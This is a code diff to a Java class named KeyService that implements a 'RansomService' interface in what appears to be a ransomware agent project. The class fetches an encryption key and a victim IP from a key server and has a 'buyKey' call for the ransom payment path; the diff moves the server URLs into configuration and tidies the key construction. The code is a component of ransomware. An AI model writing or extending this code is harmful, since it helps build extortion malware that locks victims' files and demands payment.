@@ -1,9 +1,9 @@
 package Agent.services;
 
-import javax.crypto.SecretKey;
 import javax.crypto.spec.SecretKeySpec;
 
 import org.json.JSONObject;
+import org.springframework.beans.factory.annotation.Value;
 
 import Agent.Utils.HttpUtil;
 import Agent.entites.CryptoKey;
@@ -13,15 +13,19 @@ import Agent.exceptions.InOutException;
 import Agent.exceptions.JsonException;
 
 public class KeyService implements RansomService {
+	@Value("${server.url.get}")
+	private String urlgetKey;
+	@Value("${server.url.buy}")
+	private String urlbuyKey;
 
 	@Override
 	public CryptoKey getKey() throws CryptoException {
-		return sendRequest("http://localhost:8080/requestKey");
+		return sendRequest(urlgetKey);
 	}
 
 	@Override
 	public CryptoKey buyKey() throws CryptoException {
-		return sendRequest("http://localhost:8080/buyKey");
+		return sendRequest(urlbuyKey);
 	}
 
 	private CryptoKey sendRequest(String url) throws CryptoException {
@@ -29,10 +33,10 @@ public class KeyService implements RansomService {
 			JSONObject json = (JSONObject) HttpUtil.get(url);
 			String al = json.get("algorithm").toString();
 			byte[] decodedKey = json.get("_key").toString().getBytes();
-			SecretKey k = new SecretKeySpec(decodedKey, 0, decodedKey.length, al);
-			return new CryptoKey(json.get("ip").toString(), k, al);
+			return new CryptoKey(json.get("ip").toString(), new SecretKeySpec(decodedKey, 0, decodedKey.length, al),
+					al);
 		} catch (InOutException | HttpResException | JsonException e) {
-			throw new CryptoException("Request denied");
+			throw new CryptoException("Request denied", e);
 		}
 	}
 }
